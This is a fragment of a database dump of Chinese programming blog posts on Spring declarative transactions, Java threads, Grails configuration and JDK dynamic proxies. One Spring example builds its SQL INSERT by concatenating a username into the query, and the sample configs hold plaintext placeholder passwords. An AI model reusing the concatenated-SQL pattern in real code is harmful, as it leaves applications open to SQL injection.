like&nbsp;<code>CompileStatic</code>&nbsp;but is aware of certain Grails features and allows access to those specific features to be accessed dynamically.</p>\r\n','20150422174008',0,45,0,2),(41,'<p>在spring中经常用TransactionProxyFactoryBean完成声明式事务管理</p>\r\n\r\n<p>使用TransactionProxyFactoryBean&nbsp; 需要注入它所依赖的事务管理器,设置代理的目标对象,代理对象的生成方式和事务属性.代理对象时再目标对象上生成的包含事务和AOP切面的新对象,它可以赋给目标的引用来替代目标对象,以支持事务或AOP提供的切面功能</p>\r\n\r\n<p>利用TransactionPrxyFactory来实现spring声明式事务管理</p>\r\n\r\n<p>首先,在配置文件中定义数据源和事务管理器.</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;!-- 配置数据源 --&gt;  \r\n    &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt;  \r\n        &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"&gt;&lt;/property&gt;  \r\n        &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/hibernate\"&gt;&lt;/property&gt;  \r\n        &lt;property name=\"username\" value=\"root\"&gt;&lt;/property&gt;  \r\n        &lt;property name=\"password\" value=\"123456\"&gt;&lt;/property&gt;  \r\n      \r\n    &lt;/bean&gt;  \r\n      \r\n    &lt;!-- 定义事务管理器 --&gt;   \r\n    &lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt;  \r\n        &lt;property name=\"dataSource\" ref=\"dataSource\"&gt;&lt;/property&gt;  \r\n    &lt;/bean&gt;  \r\n    &lt;!-- 声明式的事务 --&gt;  \r\n      \r\n    &lt;bean id=\"transaction\" class=\"org.springframework.transaction.interceptor.TransactionProxyFactoryBean\"&gt;  \r\n        &lt;property name=\"transactionManager\" ref=\"transactionManager\"&gt;&lt;/property&gt;  \r\n        &lt;property name=\"target\"&gt;  \r\n            &lt;bean id=\"addDao\" class=\"transaction.AddDao\"&gt;  \r\n                &lt;property name=\"dataSource\" ref=\"dataSource\"&gt;&lt;/property&gt;  \r\n            &lt;/bean&gt;  \r\n        &lt;/property&gt;  \r\n        &lt;property name=\"proxyTargetClass\" value=\"true\"&gt;&lt;/property&gt;  \r\n        &lt;property name=\"transactionAttributes\"&gt;  \r\n            &lt;props&gt;  \r\n                &lt;prop key=\"add*\"&gt;PROPAGATION_REQUIRED&lt;/prop&gt;  \r\n            &lt;/props&gt;  \r\n        &lt;/property&gt;  \r\n    &lt;/bean&gt;  </code></pre>\r\n\r\n<p>&nbsp;编写操作数据库的AddDao类,同时编写addUser()函数,在该函数中一次性实现两次数据的插入操作</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class AddDao extends JdbcDaoSupport {  \r\n    public void addUser(User user){  \r\n        String sql=\"insert into mw_person(name,age)values(\'\"+user.getUsername()+\"\',\"+23+\")\";  \r\n        getJdbcTemplate().execute(sql);  \r\n        getJdbcTemplate().execute(sql);  \r\n    }  \r\n}  </code></pre>\r\n\r\n<p>测试类:</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test {  \r\n    public static void main(String[] args) {  \r\n        Resource resource=new ClassPathResource(\"transaction/beam.xml\");  \r\n        BeanFactory factory=new XmlBeanFactory(resource);  \r\n        AddDao addDao=(AddDao)factory.getBean(\"transaction\");  \r\n        User user=new User();  \r\n        user.setUsername(\"abc\");  \r\n        user.setAge(34);  \r\n        addDao.addUser(user);  \r\n    }  \r\n}  </code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150424084950',0,46,0,1),(42,'<p>&nbsp; &nbsp; &nbsp;程序本身是一个静态的概念，而进程是程序的一次执行过程，每一个进程都有自己的地址空间。线程实际上是在进程的基础之上的进一步划分。一个进程至少对应一个线程，线程之间共享一个内存空间，线程之间可以相互切换，并发执行。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>一.线程的实现</strong></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java中实现线程有两种方式：</p>\r\n\r\n<p>1.继承Thread类</p>\r\n\r\n<p>2.实现Runnable接口（这种方式用得比较多）</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>继承Thread类实现代码：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test {  \r\n\r\n  \r\n\r\n    public static void main(String[] args){  \r\n\r\n  \r\n\r\n        myThread thread=new myThread();  \r\n\r\n        //不是马上执行线程，而是把线程置于就绪状态，等待CPU调用  \r\n\r\n        thread.start();  \r\n\r\n          \r\n\r\n    }  \r\n\r\n  \r\n\r\n}  \r\n\r\n//继承Thread类  \r\n\r\nclass myThread extends Thread{  \r\n\r\n    @Override  \r\n\r\n    public void run() {  \r\n\r\n        int i=0;  \r\n\r\n        while(true)  \r\n\r\n        {  \r\n\r\n            if(i&gt;10)  \r\n\r\n                break;  \r\n\r\n            System.out.println(i);  \r\n\r\n            i++;  \r\n\r\n        }  \r\n\r\n    }  \r\n\r\n      \r\n\r\n}  \r\n\r\n\r\n</code></pre>\r\n\r\n<p>实现Runnable接口代码：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test {  \r\n\r\n  \r\n\r\n    public static void main(String[] args){  \r\n\r\n  \r\n\r\n        myRunnable runnable=new myRunnable();  \r\n\r\n          \r\n\r\n        Thread thread=new Thread(runnable);  \r\n\r\n          \r\n\r\n        //不是马上执行线程，而是把线程置于就绪状态，等待CPU调用  \r\n\r\n        thread.start();  \r\n\r\n          \r\n\r\n    }  \r\n\r\n  \r\n\r\n}  \r\n\r\n//继承Thread类  \r\n\r\nclass myRunnable implements Runnable{     \r\n\r\n    public void run() {  \r\n\r\n        int i=0;  \r\n\r\n        while(true)  \r\n\r\n        {  \r\n\r\n            if(i&gt;10)  \r\n\r\n                break;  \r\n\r\n            System.out.println(i);  \r\n\r\n            i++;  \r\n\r\n        }  \r\n\r\n    }  \r\n\r\n      \r\n\r\n}  \r\n\r\n\r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Runnale是实现run方法,Thread是重写run方法,run方法是Runnable接口的一个抽象方法,Thread类已经实现了该接口。</strong></p>\r\n\r\n<p><strong>run方法执行完线程会正常结束</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>二.线程主要方法</strong></p>\r\n\r\n<p>1.sleep方法</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 让当前线程进入休眠状态，让出当前执行CPU的时间，该线程不会丢失任何监视器的所属权，调用方法为Thread.sleep(1000)//休眠一秒。sleep方法休眠完成后，线程会进入就绪状态，参与CPU的争抢。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;有时会看到线程调用sleep(0)，表示释放cpu时间，马上回到就绪状态争抢cpu使用权。sleep(0)可以释放当前线程执行完所剩的时间(如果有剩余的话)。这样可以让去其他线程得到执行，不会浪费所剩下的时间。提高效率。</p>\r\n\r\n<p>示例代码：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">class myRunnable implements Runnable {  \r\n\r\n    public void run() {  \r\n\r\n        int i = 0;  \r\n\r\n  \r\n\r\n        try {  \r\n\r\n            while (true) {  \r\n\r\n                if (i &gt; 10)  \r\n\r\n                    break;  \r\n\r\n                System.out.println(i);  \r\n\r\n                i++;  \r\n\r\n                Thread.sleep(1000);//休眠一秒  \r\n\r\n            }  \r\n\r\n        } catch (InterruptedException e) {  \r\n\r\n            e.printStackTrace();  \r\n\r\n        }  \r\n\r\n  \r\n\r\n    }  \r\n\r\n  \r\n\r\n}  \r\n\r\n\r\n</code></pre>\r\n\r\n<p>2.join方法</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把指定线程加入到当前线程，可以将两个交替执行的线程合并为顺序执行。如，在线程1中调用了线程2的join()方法，直到线程2执行完，才会继续执行线程1。</p>\r\n\r\n<p>join方法调用形式：</p>\r\n\r\n<p>1.join()&nbsp;&nbsp; //直到调用线程执行结束</p>\r\n\r\n<p>2.join(int millis)&nbsp; //等待调用线程指定时间</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>示例代码：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test {  \r\n\r\n  \r\n\r\n    public static void main(String[] args) {  \r\n\r\n  \r\n\r\n        myRunnable runnable = new myRunnable();  \r\n\r\n  \r\n\r\n        Thread thread = new Thread(runnable);  \r\n\r\n  \r\n\r\n        // 不是马上执行线程，而是把线程置于就绪状态，等待CPU调用  \r\n\r\n        thread.start();  \r\n\r\n  \r\n\r\n        for (int i = 0; i &lt; 9; i++) {  \r\n\r\n  \r\n\r\n            try {  \r\n\r\n                if (i == 4)  \r\n\r\n                    thread.join();//会等待子线程执行完毕在继续执行  \r\n\r\n                System.out.println(\"主线程: \"+i);  \r\n\r\n                  \r\n\r\n            } catch (InterruptedException e) {  \r\n\r\n                e.printStackTrace();  \r\n\r\n            }  \r\n\r\n        }  \r\n\r\n  \r\n\r\n    }  \r\n\r\n  \r\n\r\n}  \r\n\r\n//继承Thread类  \r\n\r\nclass myRunnable implements Runnable {  \r\n\r\n    public void run() {  \r\n\r\n        int i = 0;  \r\n\r\n  \r\n\r\n        try {  \r\n\r\n            while (true) {  \r\n\r\n                if (i &gt; 10)  \r\n\r\n                    break;  \r\n\r\n                System.out.println(\"子线程: \"+i);  \r\n\r\n                i++;  \r\n\r\n                Thread.sleep(1000);//休眠一秒  \r\n\r\n            }  \r\n\r\n        } catch (InterruptedException e) {  \r\n\r\n            e.printStackTrace();  \r\n\r\n        }  \r\n\r\n  \r\n\r\n    }  \r\n\r\n  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>3.interrupt方法</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 中断线程。其实真正中断线程是线程内部自己实现的，可以把interrupt理解为一个中断标记，告诉线程内部实现中断，当然有可能会中断失败。如果在调用interrupt方法打上中断标记后，又调用了wait()，join()，sleep()方法，此时会清除interrupt的中断标记，并抛出InterruptedException异常。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>其实不推荐使用interrupt方法来中断线程，建议使用自己定义的标记来中断线程。</p>\r\n\r\n<p>如：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">// 继承Thread类  \r\n\r\nclass myRunnable implements Runnable {  \r\n\r\n      \r\n\r\n    private boolean flag=true;//线程标记  \r\n\r\n          \r\n\r\n    public boolean isFlag() {  \r\n\r\n        return flag;  \r\n\r\n    }  \r\n\r\n  \r\n\r\n    public void setFlag(boolean flag) {  \r\n\r\n        this.flag = flag;  \r\n\r\n    }  \r\n\r\n  \r\n\r\n    public void run() {  \r\n\r\n          \r\n\r\n        while(flag){  \r\n\r\n            int i = 0;  \r\n\r\n            try {  \r\n\r\n                while (true) {  \r\n\r\n                      \r\n\r\n                    System.out.println(\"子线程: \"+i);  \r\n\r\n                    i++;  \r\n\r\n                    Thread.sleep(1000);//休眠一秒  \r\n\r\n                }  \r\n\r\n            } catch (InterruptedException e) {  \r\n\r\n                e.printStackTrace();  \r\n\r\n            }  \r\n\r\n  \r\n\r\n        }  \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;当需要终止线程时，调用setFlag(false)就可以了。此时run方法将会执行完毕，线程正常结束。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>4.yield()方法</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 让出此次cpu的执行权力，直接进入就绪状态,等待争抢下一次CPU使用权</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>yield()和sleep()的区别：</p>\r\n\r\n<p>1.sleep()使当前线程进入停滞状态，所以执行sleep()的线程在指定的时间内肯定不会执行；yield()只是使当前线程重新回到可执行状态，所以执行yield()的线程有可能在进入到可执行状态后马上又被执行。</p>\r\n\r\n<p>2.sleep()可使优先级低的线程得到执行的机会，当然也可以让同优先级和高优先级的线程有执行的机会；而yield()方法只会给相同优先级或者更高优先级的线程一个运行的机会。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>三.线程的同步和死锁</strong></p>\r\n\r\n<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</strong>&nbsp;在多个线程操作中，多个线程可能要同时处理一个资源，此时就必须使用到同步。所谓的同步就是指在一个时间段内只能有一个线程执行指定代码，其他线程要等待此线程完成后才能执行。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当多个线程同时读写同一份共享资源的时候，可能会引起冲突。这时候，我们需要引入线程&ldquo;同步&rdquo;机制，即各位线程之间要有个先来后到，不能一窝蜂挤上去抢作一团。<br />\r\n线程同步的真实意思和字面意思恰好相反。线程同步的真实意思，其实是&ldquo;排队&rdquo;：几个线程之间要排队，一个一个对共享资源进行操作，而不是同时进行操作。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>线程实现同步有两种方法：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1.同步代码块</p>\r\n\r\n<p>synchronized(同步标记){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要同步的代码</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test {  \r\n\r\n  \r\n\r\n    public static void main(String[] args) {  \r\n\r\n  \r\n\r\n        myRunnable runnable = new myRunnable();  \r\n\r\n  \r\n\r\n        //公用一份  \r\n\r\n        Thread thread1 = new Thread(runnable);        \r\n\r\n        Thread thread2 = new Thread(runnable);  \r\n\r\n  \r\n\r\n        // 不是马上执行线程，而是把线程置于就绪状态，等待CPU调用  \r\n\r\n        thread1.start();  \r\n\r\n  \r\n\r\n        thread2.start();  \r\n\r\n      \r\n\r\n    }  \r\n\r\n      \r\n\r\n}  \r\n\r\n  \r\n\r\n// 继承Thread类  \r\n\r\nclass myRunnable implements Runnable {  \r\n\r\n      \r\n\r\n    Object obj=new Object();//同步标记  \r\n\r\n  \r\n\r\n    public void run() {  \r\n\r\n      synchronized(obj){  \r\n\r\n        int i = 0;  \r\n\r\n        try {  \r\n\r\n            while (true) {  \r\n\r\n                if(i==5)  \r\n\r\n                    break;  \r\n\r\n                System.out.println(\"子线程: \" + i);  \r\n\r\n                i++;  \r\n\r\n                Thread.sleep(1000);// 休眠一秒  \r\n\r\n            }  \r\n\r\n        } catch (InterruptedException e) {  \r\n\r\n            e.printStackTrace();  \r\n\r\n        }  \r\n\r\n  \r\n\r\n    }  \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>解释：若先thread1执行代码块，此时thread1会打上标记，可以理解为锁上门，当本次事件用完thread1还没执行完同步代码块；下一次thread2抢得cpu执行权，要执行此同步代码块，然而代码块被thread1上了锁，即打上了标记；此时thread2进不去，只能在门外干等把此次cpu事件消耗完。下一次若thread1抢得cpu执行权，本次thread1执行完代码块，即消除标记，打开门上的锁，下次若thread2抢得cpu执行权，则打上thread2的标记，执行同步代码块。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2.同步方法</p>\r\n\r\n<p>public&nbsp; synchronized void&nbsp; method()</p>\r\n\r\n<p>{<br />\r\n}</p>\r\n\r\n<p>如：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">// 继承Thread类  \r\n\r\nclass myRunnable implements Runnable {  \r\n\r\n      \r\n\r\n    Object obj=new Object();//同步标记  \r\n\r\n  \r\n\r\n    public  synchronized void run() {  \r\n\r\n       \r\n\r\n        this.myMethod();  \r\n\r\n    }  \r\n\r\n      \r\n\r\n    public void myMethod()  \r\n\r\n    {  \r\n\r\n        int i = 0;  \r\n\r\n        try {  \r\n\r\n            while (true) {  \r\n\r\n                if(i==5)  \r\n\r\n                    break;  \r\n\r\n                System.out.println(\"子线程: \" + i);  \r\n\r\n                i++;  \r\n\r\n                Thread.sleep(1000);// 休眠一秒  \r\n\r\n            }  \r\n\r\n        } catch (InterruptedException e) {  \r\n\r\n            e.printStackTrace();  \r\n\r\n        }  \r\n\r\n  \r\n\r\n          \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>此时标记的对象是当前对象this对象</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>两者的主要区别：代码块同步可以只同步方法里的部分代码,同步方法是同步整个方法</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>同步时可能会用线程干等浪费CPU处理时间,所以会导致性能下降。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2.线程的死锁</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如：</p>\r\n\r\n<p>线程1指向需要线程2的方法,而线程2执行需要线程1方法,此时双方都是同步的,都上了自己的标记，导致线程1不能执行线程2的方法,而线程2也不能执行线程1的方法.导致僵持。形成死锁。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>过多的同步容易出现死锁，死锁一般是在程序运行过程中出现</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n','20150424085600',0,47,0,1),(43,'<pre>\r\n<code class=\"language-java\"> public Map searchUser(Map params) {\r\n        def result = [:];\r\n        double longitude = params.longitude as double;\r\n        double latitude = params.latitude as double;\r\n        int max = params.max ? params.max as int : 10;\r\n        int offset = params.offset ? params.offset as int : max;\r\n        User currentUser = utilService.currentUser;\r\n\r\n        def userList = GpsLocation.executeQuery(\"select l.user,l as lat1,max(l.createDate) from GpsLocation l group by l.user order by acos(sin((:lat * 3.1415) / 180 ) *sin((l.latitude * 3.1415) / 180 ) +cos((:lat * 3.1415) / 180 ) * cos((l.latitude * 3.1415) / 180 ) *cos((:lon * 3.1415) / 180 - (l.longitude * 3.1415) / 180 ) ) * 6380 asc\", [lat: latitude, lon: longitude], [max: max, offset: offset]);\r\n        result.userList = userList;\r\n        result.success = true;\r\n        return result;\r\n    }</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150506083848',0,51,0,2),(44,'<p><span style=\"font-family:arial; font-size:14px\">方法一：在conf/spring目录下添加一个resources.xml,配置一个dataSource数据源，覆盖DataSource.groovy中的数据源&nbsp;</span></p>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">方法二：修改conf/config.groovy 文件，覆盖现在有的DataSource.groovy中的数据源，让新的数据源从gis.properties文件中获取，这个文件组放在工程目录下&nbsp;</span><br />\r\n&nbsp;</p>\r\n','20150506084611',0,52,0,4),(45,'<p>jdk动态代理要对一个类进行代理，被代理的类必须实现至少一个接口，并且只有接口中的方法才能被代理。</p>\r\n\r\n<p>jdk实现动态代理一般分为三步：</p>\r\n\r\n<p><strong>1.</strong> 编写接口和实现类。</p>\r\n\r\n<p><strong>2.</strong> 写一个处理器，该处理器实现InvocationHandler接口，该接口只有一个方法，其签名为public Object invoke(Object proxy, Method method, Object[] args)<br />\r\nthrows Throwable;可在该处理器的实现方法中，在方法调用前和调用后加入自己的代码，从而进行动态拦截。要注意的是proxy为生成的动态代理类，并不是真的我们被代理的类，所以可在处理器中加入Object类型的成员变量，指向我们真正要求被代理的类（即第1步中的实现类）。</p>\r\n\r\n<p><strong>3. </strong>使用java.lang.reflect.Proxy类的newProxyInstance方法生成动态代理类。对所有要代理方法的调用，都是直接调用生成的动态代理类的方法即可，但是要先对它进行强制类型转换，转换成我们要调用的方法的接口。</p>\r\n\r\n<p><strong>JDK原理分析：</strong><br />\r\n通过分析Proxy的源代码，可看到动态代理类的详细生成。newProxyInstance方法首先生成动态代理类的Class实例，再调用它的参数类型为InvocationHandler的构造函数来生成动态代理类并返回。<br />\r\n<br />\r\n动态代理类的Class实例是怎么生成的呢，是通过ProxyGenerator类来生成动态代理类的class字节流，把它载入方法区。<br />\r\n<br />\r\n分析class字节流生成的过程可以看到它使用Proxy为它的父类，实现所有要代理的接口的方法，每个方法的实现体里主要都是调用处理器的invoke方法。</p>\r\n\r\n<p><strong>class字节流的生成过程的主要代码如下：</strong></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">\r\nprivate byte[] generateClassFile()\r\n    {\r\n        addProxyMethod(hashCodeMethod, java/lang/Object);\r\n        addProxyMethod(equalsMethod, java/lang/Object);\r\n        addProxyMethod(toStringMethod, java/lang/Object);\r\n        for(int i = 0; i &lt; interfaces.length; i++)\r\n        {\r\n            Method amethod[] = interfaces[i].getMethods();\r\n            for(int k = 0; k &lt; amethod.length; k++)\r\n                addProxyMethod(amethod[k], interfaces[i]);\r\n        }\r\n        List list;\r\n        for(Iterator iterator = proxyMethods.values().iterator(); iterator.hasNext(); checkReturnTypes(list))\r\n            list = (List)iterator.next();\r\n        try\r\n        {\r\n            methods.add(generateConstructor());\r\n            for(Iterator iterator1 = proxyMethods.values().iterator(); iterator1.hasNext();)\r\n            {\r\n                List list1 = (List)iterator1.next();\r\n                Iterator iterator2 = list1.iterator();\r\n                while(iterator2.hasNext()) \r\n                {\r\n                    ProxyMethod proxymethod = (ProxyMethod)iterator2.next();\r\n                    fields.add(new FieldInfo(proxymethod.methodFieldName, \"Ljava/lang/reflect/Method;\", 10));\r\n                    methods.add(proxymethod.generateMethod());\r\n    }  \r\n    }  \r\n\r\n    methods.add(generateStaticInitializer());  \r\n}  \r\ncatch(IOException ioexception)  \r\n{  \r\n    throw new InternalError(\"unexpected I/O Exception\");  \r\n}  \r\nif(methods.size() &gt; 65535)  \r\n    throw new IllegalArgumentException(\"method limit exceeded\");  \r\nif(fields.size() &gt; 65535)  \r\n    throw new IllegalArgumentException(\"field limit exceeded\");  \r\ncp.getClass(dotToSlash(className));  \r\ncp.getClass(\"java/lang/reflect/Proxy\");  \r\nfor(int j = 0; j &lt; interfaces.length; j++)  \r\n    cp.getClass(dotToSlash(interfaces[j].getName()));  \r\n\r\ncp.setReadOnly();  \r\nByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();  \r\nDataOutputStream dataoutputstream = new DataOutputStream(bytearrayoutputstream);  \r\ntry  \r\n{  \r\n    dataoutputstream.writeInt(-889275714);  \r\n    dataoutputstream.writeShort(0);  \r\n    dataoutputstream.writeShort(49);  \r\n    cp.write(dataoutputstream);  \r\n    dataoutputstream.writeShort(49);  \r\n    dataoutputstream.writeShort(cp.getClass(dotToSlash(className)));  \r\n    dataoutputstream.writeShort(cp.getClass(\"java/lang/reflect/Proxy\"));  \r\n    dataoutputstream.writeShort(interfaces.length);  \r\n    for(int l = 0; l &lt; interfaces.length; l++)  \r\n        dataoutputstream.writeShort(cp.getClass(dotToSlash(interfaces[l].getName())));  \r\n\r\n    dataoutputstream.writeShort(fields.size());  \r\n    FieldInfo fieldinfo;  \r\n//添加属性\r\nfor(Iterator iterator3 = fields.iterator(); iterator3.hasNext(); fieldinfo.write(dataoutputstream))\r\n\r\nfieldinfo = (FieldInfo)iterator3.next();\r\n            //添加方法\r\n            dataoutputstream.writeShort(methods.size());\r\n            MethodInfo methodinfo;\r\n            for(Iterator iterator4 = methods.iterator(); iterator4.hasNext(); methodinfo.write(dataoutputstream))\r\n                methodinfo = (MethodInfo)iterator4.next();\r\n\r\n            dataoutputstream.writeShort(0);\r\n        }\r\n        catch(IOException ioexception1)\r\n        {\r\n            throw new InternalError(\"unexpected I/O Exception\");\r\n        }\r\n        return bytearrayoutputstream.toByteArray();\r\n    }\r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150506084654',0,48,0,1),(46,'<p>找到grails-app/conf/Config.groovy文件，里面有个grails.config.locations=[&quot;file:${userHome}/config.properties&quot;];指定属性文件位置，属性文件配置格式</p>\r\n\r\n<pre>\r\n<code class=\"language-ini\">###############SQLServer配置############################\r\n#dataSource.pooled=true\r\n#dataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver\r\n#dataSource.url=jdbc:sqlserver://localhost:1433;DatabaseName=nts\r\n#dataSource.dbCreate=update\r\n#dataSource.username=sa\r\n#dataSource.password=vod2\r\n\r\n##############MYSQL配置################################\r\n#dataSource.pooled=true\r\n#dataSource.driverClassName=com.mysql.jdbc.Driver\r\n#dataSource.url=jdbc:mysql://127.0.0.1:3306/coderstar?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;autoReconnect=true&amp;failOverReadOnly=false\r\n#dataSource.dbCreate=update\r\n#dataSource.username=root\r\n#dataSource.password=password\r\n#hibernate.dialect=org.hibernate.dialect.MySQLDialect\r\n\r\n############H2文件数据库配置##########################\r\ndataSource.url=jdbc:h2:~/.cs/coderstar/file-db/cs\r\ndataSource.username=sa\r\ndataSource.dbCreate=update\r\ndataSource.password=password\r\ndataSource.driverClassName=org.h2.Driver\r\nhibernate.dialect=org.hibernate.dialect.H2Dialect\r\n##########################数据链接优化###########################\r\ndataSource.properties.maxActive = 50\r\ndataSource.properties.maxIdle = 25\r\ndataSource.properties.minIdle = 5\r\ndataSource.properties.initialSize = 5\r\ndataSource.properties.minEvictableIdleTimeMillis = 60000\r\ndataSource.properties.timeBetweenEvictionRunsMillis = 60000\r\ndataSource.properties.maxWait = 10000\r\ndataSource.properties.jmxEnabled = true\r\ndataSource.properties.maxAge = 600000\r\ndataSource.properties.validationQuery = \"SELECT 1\"\r\ndataSource.properties.validationQueryTimeout = 3\r\ndataSource.properties.validationInterval = 15000\r\ndataSource.properties.testOnBorrow = true\r\ndataSource.properties.testWhileIdle = true\r\ndataSource.properties.testOnReturn = false\r\ndataSource.properties.jdbcInterceptors = ConnectionState;StatementFinalizer(useEquals=true)\r\ndataSource.properties.defaultTransactionIsolation = 2\r\n\r\n####################Hibernate优化##############################\r\nhibernate.cache.use_second_level_cache=true\r\nhibernate.cache.use_query_cache=true\r\nhibernate.cache.provider_class=net.sf.ehcache.hibernate.EhCacheProvider\r\n\r\n####################日志级别##############################\r\n#日志配置有error,info,debug,none等级别\r\nlogLevel = info\r\n#sql日志打印\r\n#dataSource.logSql = true</code></pre>\r\n\r\n<p>当然也可以增加grails的其他配置（如log4j）到里面，配置后启动会自动加载</p>\r\n','20150506085203',0,52,0,1),(47,'<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">之前虽然会用JDK的动态代理，但是有些问题却一直没有搞明白。比如说：InvocationHandler的invoke方法是由谁来调用的，代理对象是怎么生成的，直到前几个星期才把这些问题全部搞明白了。&nbsp;</span><br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;&nbsp;&nbsp; 废话不多说了，先来看一下JDK的动态是怎么用的。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package dynamic.proxy; \r\n\r\nimport java.lang.reflect.InvocationHandler;\r\nimport java.lang.reflect.Method;\r\nimport java.lang.reflect.Proxy;\r\n\r\n/**\r\n * 实现自己的InvocationHandler\r\n * @author zyb\r\n * @since 2012-8-9\r\n *\r\n */\r\npublic class MyInvocationHandler implements InvocationHandler {\r\n	\r\n	// 目标对象 \r\n	private Object target;\r\n	\r\n	/**\r\n	 * 构造方法\r\n	 * @param target 目标对象 \r\n	 */\r\n	public MyInvocationHandler(Object target) {\r\n		super();\r\n		this.target = target;\r\n	}\r\n\r\n\r\n	/**\r\n	 * 执行目标对象的方法\r\n	 */\r\n	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\r\n		\r\n		// 在目标对象的方法执行之前简单的打印一下\r\n		System.out.println(\"------------------before------------------\");\r\n		\r\n		// 执行目标对象的方法\r\n		Object result = method.invoke(target, args);\r\n		\r\n		// 在目标对象的方法执行之后简单的打印一下\r\n		System.out.println(\"-------------------after------------------\");\r\n		\r\n		return result;\r\n	}\r\n\r\n	/**\r\n	 * 获取目标对象的代理对象\r\n	 * @return 代理对象\r\n	 */\r\n	public Object getProxy() {\r\n		return Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), \r\n				target.getClass().getInterfaces(), this);\r\n	}\r\n}\r\n\r\npackage dynamic.proxy;\r\n\r\n/**\r\n * 目标对象实现的接口，用JDK来生成代理对象一定要实现一个接口\r\n * @author zyb\r\n * @since 2012-8-9\r\n *\r\n */\r\npublic interface UserService {\r\n\r\n	/**\r\n	 * 目标方法 \r\n	 */\r\n	public abstract void add();\r\n\r\n}\r\n\r\npackage dynamic.proxy; \r\n\r\n/**\r\n * 目标对象\r\n * @author zyb\r\n * @since 2012-8-9\r\n *\r\n */\r\npublic class UserServiceImpl implements UserService {\r\n\r\n	/* (non-Javadoc)\r\n	 * @see dynamic.proxy.UserService#add()\r\n	 */\r\n	